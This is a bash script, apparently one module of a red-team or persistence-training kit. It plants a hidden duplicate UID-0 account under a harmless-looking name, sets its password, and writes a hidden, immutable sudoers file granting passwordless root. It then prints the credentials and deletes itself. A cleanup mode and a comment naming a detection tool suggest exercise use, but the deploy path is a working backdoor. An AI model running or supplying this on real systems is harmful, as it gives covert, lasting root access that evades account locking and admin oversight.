#!/usr/bin/env bash
# Shadow root: duplicate UID 0 account under a benign-looking username.
# Survives: passwd -l sysadmin, userdel sysadmin, password changes.
# Detected by: defender-cli anti-persistence --users (flags UID 0 duplicates)
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

USERNAME="${SHADOW_USER:-sys.sync}"
PASSWORD="${SHADOW_PASS:-$(openssl rand -base64 16 | tr -dc 'a-zA-Z0-9' | head -c 16)}"
SUDOERS_FILE="/etc/sudoers.d/.${USERNAME//./_}"

case "${1:-}" in
  deploy)
    if getent passwd "$USERNAME" &>/dev/null; then
      echo "[!] User ${USERNAME} already exists"
      exit 1
    fi
    useradd -u 0 -o -g 0 -s /bin/bash -d /root -M "$USERNAME"
    echo "${USERNAME}:${PASSWORD}" | chpasswd
    echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
    chmod 440 "$SUDOERS_FILE"
    chattr +i "$SUDOERS_FILE" 2>/dev/null || true
    echo "[+] 01_shadow_root: user=${USERNAME} password=${PASSWORD}"
    echo "[+] 01_shadow_root: sudoers=${SUDOERS_FILE} (immutable)"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    chattr -i "$SUDOERS_FILE" 2>/dev/null || true
    rm -f "$SUDOERS_FILE"
    userdel "$USERNAME" 2>/dev/null || true
    echo "[-] 01_shadow_root: ${USERNAME} removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
